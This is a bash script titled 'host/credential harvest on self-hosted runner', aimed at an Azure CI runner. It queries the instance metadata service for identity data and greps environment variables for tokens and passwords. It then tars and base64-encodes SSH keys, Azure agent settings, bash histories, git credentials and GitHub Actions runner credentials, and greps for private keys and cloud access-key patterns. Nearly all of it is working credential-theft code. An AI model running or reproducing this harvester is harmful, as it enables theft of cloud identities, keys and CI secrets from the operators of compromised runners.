#!/bin/bash
# az/harvest.sh - host/credential harvest on self-hosted runner
set -u
export CURL="curl -s -m 10 --noproxy *"
say(){ echo; echo "###$1"; }
say HARVEST_START
echo "host=$(hostname -s) date=$(date -u +%FT%TZ)"
say ID; id
say UNAME; uname -a
say GPU; nvidia-smi -L 2>&1
say PROC1; tr '\0' ' ' < /proc/1/cmdline 2>/dev/null; echo
say NET_ADDR; ip -4 addr show 2>&1
say NET_ROUTE; ip -4 route 2>&1
say RESOLV; cat /etc/resolv.conf 2>/dev/null
say HOSTS; cat /etc/hosts 2>/dev/null
say NEIGH; ip neigh 2>/dev/null
say IMDS_INSTANCE
$CURL -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-11-15" -o /tmp/imds_instance.json
head -c 5000 /tmp/imds_instance.json; echo
say IMDS_IDENTITIES
$CURL -H Metadata:true "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" -o /tmp/imds_identities.json
head -c 4000 /tmp/imds_identities.json; echo
say ENV_IDENTITY
env | grep -iE 'IDENTITY|MSI|AZURE|ARM|TOKEN|SECRET|PASSWORD|CLIENT' | head -40
say SSH_FILES
ls -la /root/.ssh /home/*/.ssh 2>&1 | head -80
say SSH_TAR_B64_BEGIN
tar czf - --exclude='*.log' --exclude='*.gz' --exclude='*.zip' --exclude='*.so' \
  /root/.ssh /home/*/.ssh /etc/ssh /etc/waagent.conf /var/lib/azure \
  /var/lib/waagent/Extension /var/lib/cloud/instance \
  /root/.azure /home/*/.azure /root/.bash_history /home/*/.bash_history \
  /root/.git-credentials /home/*/.git-credentials /etc/environment /etc/profile.d \
  /opt/actions-runner/.runner /opt/actions-runner/.credentials 2>/dev/null | base64 -w0
echo
say SSH_TAR_B64_END
say KEY_GREP
grep -rIl "BEGIN .*PRIVATE KEY" /root /home /etc /opt /var/lib/waagent 2>/dev/null | head -40
say WAAGENT_SETTINGS
for f in /var/lib/waagent/Extension/*/config/*.settings /var/lib/waagent/*/config/*.settings /var/lib/cloud/instance/user-data.txt /var/lib/cloud/instance/*.txt; do
  [ -f "$f" ] || continue
  echo "== FILE $f size=$(stat -c%s "$f" 2>/dev/null)"
  head -c 6000 "$f"; echo
done
say SECRET_GREP
grep -rInE 'AKIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[0-9A-Za-z]{12,}|client_secret|accountKey|sasToken|SharedAccessSignature|password|BEGIN .*PRIVATE KEY' \
  /root /home /etc /opt/actions-runner /var/lib/cloud /var/lib/waagent/Extension 2>/dev/null \
  | grep -v 'Binary file' | head -60 | cut -c1-400
say HARVEST_END
